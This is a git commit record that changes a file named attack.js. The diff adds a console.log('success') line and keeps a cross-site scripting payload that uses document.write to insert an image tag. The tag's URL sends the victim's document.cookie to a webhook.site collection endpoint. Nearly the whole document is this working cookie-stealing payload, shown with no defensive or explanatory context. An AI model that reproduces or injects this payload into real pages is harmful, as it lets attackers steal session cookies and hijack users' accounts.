3704a783777ef20c2880fd47215a13c436015f89
Boy_314 <32818287+Boy-314@users.noreply.github.com>
2023-02-01 22:56:35 -0500

    Update attack.js

--- attack.js
+++ attack.js
@@ -1,3 +1,4 @@
 <script>
-document.write('<img src="https://webhook.site/45513f89-674d-48b5-9b70-771bd6ee5515?c='+document.cookie+'" />');
+  console.log("success");
+  document.write('<img src="https://webhook.site/45513f89-674d-48b5-9b70-771bd6ee5515?c='+document.cookie+'" />');
 </script>
